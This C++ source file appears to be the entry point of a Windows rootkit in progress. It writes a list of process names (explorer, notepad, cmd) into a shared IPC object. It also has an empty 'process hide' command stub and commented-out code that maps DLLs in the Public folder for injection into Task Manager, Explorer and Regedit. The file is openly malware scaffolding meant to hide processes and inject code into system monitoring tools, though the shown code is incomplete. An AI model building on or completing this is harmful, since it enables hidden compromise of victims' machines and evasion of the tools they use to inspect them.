#include <iostream>
#include <Windows.h>
#include <vector>
#include <AccCtrl.h>
#include <Aclapi.h> 
#include <string>
#include <unordered_map>
#include "IPCObjects.h"
#include "multiDLLInjector.h"

using namespace std;

int main(int argc, char* argv[]){        
    unordered_map<string, vector<string>> injectionMap;
    vector<string> agentDescriptor;

    Serialitzator serialitzator("ipcObject");

    vector<wchar_t*> stringsToSerialize;
    wstring str1 = L"explorer.exe";
    wstring str2 = L"notepad.exe";
    wstring str3 = L"cmd.exe";
    stringsToSerialize.push_back((wchar_t*)str1.c_str());
    stringsToSerialize.push_back((wchar_t*)str2.c_str());
    stringsToSerialize.push_back((wchar_t*)str3.c_str());

    serialitzator.serializeVectorWCharTPointer(stringsToSerialize,L"agentMapped");
    
    /*vector<wchar_t*> deserializedStrings = serialitzator.deserializeWCharTPointerVector(L"agentMapped");
    for (auto& str : deserializedStrings) {
		wcout << str << endl;
	}*/

    getchar();

    // - rootkit.exe process hide processname.exe
    if (argc == 4 && strcmp(argv[1], "process") == 0 && strcmp(argv[2], "hide") == 0) {
		char* processName = argv[3];

	}
    

    // Inject DLL's into processes
    //injectionMap["taskmgr.exe"] = { "C:\\Users\\Public\\mscde.dll","C:\\Users\\Public\\msc23.dll"};
    //injectionMap["explorer.exe"] = { "C:\\Users\\Public\\mscde.dll" };
   // injectionMap["regedit.exe"] = { "C:\\Users\\Public\\mscde.dll" };

    //injectDlls(injectionMap);
}


